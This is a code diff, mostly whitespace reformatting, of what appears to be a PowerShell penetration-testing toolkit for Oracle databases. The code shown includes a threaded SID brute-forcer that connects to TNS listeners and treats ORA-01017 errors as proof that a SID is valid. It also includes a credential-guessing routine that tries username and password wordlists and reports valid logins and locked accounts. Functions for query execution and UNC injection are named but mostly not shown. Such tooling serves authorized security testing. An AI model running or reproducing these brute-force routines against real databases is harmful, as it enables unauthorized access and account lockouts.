@@ -43,7 +43,7 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 
 #>
 
-        #Assigning Args
+	#Assigning Args
         [CmdletBinding()]
         Param(
         [Parameter(Mandatory = $false)]
@@ -60,79 +60,75 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 	[Int]$Threads = 20
 )
 
-		#Initialize Arrays
-		$HostTargetList = @()
-		$sidWordList = @()
+	#Initialize Arrays
+	$HostTargetList = @()
+	$sidWordList = @()
 
 		
         #Loads .NET OracleClient Assembly
-		Add-Type -AssemblyName System.Data.OracleClient
+	Add-Type -AssemblyName System.Data.OracleClient
 
-		#Populate arrays with user provided data
-		if ($HostList){
-			foreach($ip in Get-Content -Path $HostList){
-				$HostTargetList += $ip
-			}
+	#Populate arrays with user provided data
+	if ($HostList){
+		foreach($ip in Get-Content -Path $HostList){
+			$HostTargetList += $ip
 		}
-		else{
-			$HostTargetList += $HostName
-		}
+	}
+	else{
+		$HostTargetList += $HostName
+	}
 		
-		if ($SIDList){
-			foreach($sid in Get-Content -Path $SIDList){
-				$sidWordList += $sid
-			}
+	if ($SIDList){
+		foreach($sid in Get-Content -Path $SIDList){
+			$sidWordList += $sid
 		}
-		else{
-			$sidWordList += $SID
-		}
+	}
+	else{
+		$sidWordList += $SID
+	}
 		
-		Write-Host "`nINFO: Now attempting to connect to the remote TNS listener......`n"
+	Write-Host "`nINFO: Now attempting to connect to the remote TNS listener......`n"
 		
-		#Create script block
-		$oracleScriptBlock = {
-			param($iterator, $HostPort, $sidWordList)
-			foreach ($s in $sidWordList){
-			###########################################################
-			#Creates connection string to use for targeted TNSListener
-			$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$iterator)(Port=$HostPort)))(CONNECT_DATA=(SID=$s)));"
-			#Creates new object with oracle client .net class using created connection string
-			$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
+	#Create script block
+	$oracleScriptBlock = {
+		param($iterator, $HostPort, $sidWordList)
+		foreach ($s in $sidWordList){
+		
+		#Creates connection string to use for targeted TNSListener
+		$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$iterator)(Port=$HostPort)))(CONNECT_DATA=(SID=$s)));"
+		#Creates new object with oracle client .net class using created connection string
+		$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
 
 			
-			try
-			{
-				#Attempts connection
-				$conn.Open()
-        
-			}
-			catch
-			{
-				#Assigns exception message to var
-				$ErrorMessage = $_.Exception.Message
-				#01017 is the ORA exception that implies failed username/password. Cannot get to this phase without valid SID, therefore the existence of 01017 implies correct SID
-				if ($ErrorMessage -match "01017"){
-					Write-Host -Object "[+] $s for the TNS listener at $iterator is valid!" -ForegroundColor 'green'
-				}
-				else{
-					Write-Host  -Object "[-] $s is invalid for the TNS listener at $iterator." -ForegroundColor 'red'
-				}
-        
-				#Close connection
-				$conn.Close()
-			}
-			}		
-		$Result
-		
+		try{
+			#Attempts connection
+			$conn.Open()
 		}
-            # Establish parameters to pass to Invoke-ThreadedFunction
-            $ScriptParams = @{
-                'HostPort' = $HostPort
-                'sidWordList' = $sidWordList
-            }
+		catch{
+			#Assigns exception message to var
+			$ErrorMessage = $_.Exception.Message
+			#01017 is the ORA exception that implies failed username/password. Cannot get to this phase without valid SID, therefore the existence of 01017 implies correct SID
+			if ($ErrorMessage -match "01017"){
+				Write-Host -Object "[+] $s for the TNS listener at $iterator is valid!" -ForegroundColor 'green'
+			}
+			else{
+				Write-Host  -Object "[-] $s is invalid for the TNS listener at $iterator." -ForegroundColor 'red'
+			}
+        
+			#Close connection
+			$conn.Close()
+		}
+		}		
+		
+	}
+        # Establish parameters to pass to Invoke-ThreadedFunction
+        $ScriptParams = @{
+               'HostPort' = $HostPort
+               'sidWordList' = $sidWordList
+        }
 
-            # kick off the threaded script block + arguments 	
-			Invoke-ThreadedFunction -iterator $HostTargetList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams					
+       # kick off the threaded script block + arguments 	
+	Invoke-ThreadedFunction -iterator $HostTargetList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams					
 }
 
 function Invoke-CredentialGuess {
@@ -197,76 +193,73 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
         [Int]$Threads = 20
 )
         #Loads .NET OracleClient Assembly
-		Add-Type -AssemblyName System.Data.OracleClient
+	Add-Type -AssemblyName System.Data.OracleClient
 		
-		#Initialize Arrays
-		$UsernameWordList = @()
-		$PasswordWordList = @()
+	#Initialize Arrays
+	$UsernameWordList = @()
+	$PasswordWordList = @()
 		
-		#Populate arrays with user provided data
-		if ($UsernameList){
-			foreach($user in Get-Content -Path $UsernameList){
-				$UsernameWordList += $user
-			}
+	#Populate arrays with user provided data
+	if ($UsernameList){
+		foreach($user in Get-Content -Path $UsernameList){
+			$UsernameWordList += $user
 		}
-		else{
-			$UsernameWordList += $Username
+	}
+	else{
+		$UsernameWordList += $Username
+	}
+	if ($PasswordList){
+		foreach($pass in Get-Content -Path $PasswordList){
+			$PasswordWordList += $pass
 		}
-		if ($PasswordList){
-			foreach($pass in Get-Content -Path $PasswordList){
-				$PasswordWordList += $pass
-			}
-		}
-		else{
-			$PasswordWordList += $Password
-		}
+	}
+	else{
+		$PasswordWordList += $Password
+	}
 		
-		Write-Host "`nINFO: Now beginning credential guessing attempts......`n"
+	Write-Host "`nINFO: Now beginning credential guessing attempts......`n"
 		
-		#Create script block
-		$oracleScriptBlock = {
+	#Create script block
+	$oracleScriptBlock = {
 		param($iterator, $HostName, $HostPort, $SID, $PasswordWordList )
-			foreach ($p in $PasswordWordList){
-				#Creates connection string to use for targeted TNSListener
-				$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$iterator;Password=$p"
-				#Creates new object with oracle client .net class using created connection string
-				$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
+		foreach ($p in $PasswordWordList){
+			#Creates connection string to use for targeted TNSListener
+			$connectionString = "Data Source=(DESCRIPTION=(ADDRESS_LIST=(ADDRESS=(PROTOCOL=TCP)(Host=$HostName)(Port=$HostPort)))(CONNECT_DATA=(SID=$SID)));User id=$iterator;Password=$p"
+			#Creates new object with oracle client .net class using created connection string
+			$conn = New-Object -TypeName System.Data.OracleClient.OracleConnection($connectionString)
 				
-				try
-				{
-					$conn.Open()
-					Write-Host  -Object "[+] The provided Username $iterator and Password $p were correct!" -ForegroundColor 'green'
-				}
-				catch
-				{
-					#Assigns exception message to var
-					$ErrorMessage = $_.Exception.Message
-					#01017 is the ORA exception that implies failed username/password. 
-					if ($ErrorMessage -match "01017"){
-						Write-Host  -Object "[-] The provided Username $iterator and Password $p were incorrect!" -ForegroundColor 'red'
-					}
-					elseif ($ErrorMessage -match "28000"){
-						Write-Host  -Object "[*] The provided Username $iterator has a status of Locked Out!" -ForegroundColor 'yellow'
-					}
-					else{
-					
-						Write-Host  -Object "[*] Connection Failed. Error: $ErrorMessage" -ForegroundColor 'red'
-					}			
-				}
-			$conn.Close()
+			try{
+				$conn.Open()
+				Write-Host  -Object "[+] The provided Username $iterator and Password $p were correct!" -ForegroundColor 'green'
 			}
+			catch{
+				#Assigns exception message to var
+				$ErrorMessage = $_.Exception.Message
+				#01017 is the ORA exception that implies failed username/password. 
+				if ($ErrorMessage -match "01017"){
+					Write-Host  -Object "[-] The provided Username $iterator and Password $p were incorrect!" -ForegroundColor 'red'
+				}
+				elseif ($ErrorMessage -match "28000"){
+					Write-Host  -Object "[*] The provided Username $iterator has a status of Locked Out!" -ForegroundColor 'yellow'
+				}
+				else{
+					Write-Host  -Object "[*] Connection Failed. Error: $ErrorMessage" -ForegroundColor 'red'
+				}			
+			}
+			$conn.Close()
+		}
 					
 	}		
         # Establish parameters to pass to Invoke-ThreadedFunction
         $ScriptParams = @{
-			'HostName' = $HostName
-			'HostPort' = $HostPort
-			'SID' = $SID
-            'PasswordWordList' = $PasswordWordList
+		'HostName' = $HostName
+		'HostPort' = $HostPort
+		'SID' = $SID
+        	'PasswordWordList' = $PasswordWordList
         }	
 		
         # kick off the threaded script block + arguments 	
-	    Invoke-ThreadedFunction -iterator $UsernameWordList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams
+	Invoke-ThreadedFunction -iterator $UsernameWordList -Threads $Threads -ScriptBlock $oracleScriptBlock -ScriptParameters $ScriptParams
 }
 
 function Invoke-QueryExec {
@@ -346,7 +339,7 @@ https://technet.microsoft.com/en-us/library/hh849914.aspx
 		$ErrorMessage = $_.Exception.Message
 		Write-Host  -Object "`n[*] Query execution Failed. Error: $ErrorMessage" -ForegroundColor 'red'						
 	}
-$conn.Close()
+	$conn.Close()
 }
 
 function Invoke-UNCInject-DS {
@@ -459,7 +452,7 @@ http://dbatricksworld.com/ora-65096-invalid-common-user-or-role-name-and-ora-650
 #########################################################################################################################
 #
 # Helper function taken straight from https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
-#
+#Thanks @harmj0y and @darkoperator!
 #########################################################################################################################
 
 function Invoke-ThreadedFunction {
